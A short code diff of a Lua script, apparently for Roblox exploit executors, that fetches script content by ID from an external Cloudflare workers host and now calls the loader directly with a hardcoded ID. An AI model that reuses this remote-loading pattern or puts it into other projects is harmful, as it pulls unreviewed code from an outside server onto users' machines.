@@ -11,7 +11,7 @@ end
 local function snd(url, msg)
     local reqBody = { content = msg }
     local headers = { ["Content-Type"] = "application/json" }
-    
+
     local success, result = pcall(function()
         local request = http_request or request or syn.request or http.request
         return request({
@@ -21,18 +21,18 @@ local function snd(url, msg)
             Body = HttpService:JSONEncode(reqBody)
         })
     end)
-    
+
     return success and result or nil
 end
 
 local function loadExternalScript(scriptId)
     local url = "https://interm.brunotoledo526.workers.dev"
     local data = { id = scriptId }
-    
+
     local success, result = pcall(function()
         return snd(url, HttpService:JSONEncode(data))
     end)
-    
+
     if success and result and result.Body then
         local scriptContent = result.Body
         print("Script content received:", scriptContent)
@@ -55,4 +55,5 @@ local function loadExternalScript(scriptId)
     end
 end
 
-return loadExternalScript
+-- Prueba de carga con un ID de script
+loadExternalScript("18452374759")
